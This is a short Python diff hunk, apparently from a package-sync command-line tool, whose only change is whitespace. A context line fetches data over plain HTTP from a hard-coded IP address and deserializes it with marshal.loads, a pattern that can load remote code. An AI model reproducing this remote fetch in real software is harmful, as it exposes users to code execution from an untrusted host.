@@ -55,7 +55,7 @@ async def cli_pkg_sync_repo(args_):
         with open(args.to + '/index', 'w') as f:
             f.buffer.write(y.encode_prof(index))
 
-    
+
 def step(where):
     data = marshal.loads(urllib2.urlopen('http://138.68.80.104:81/worker').read())
 
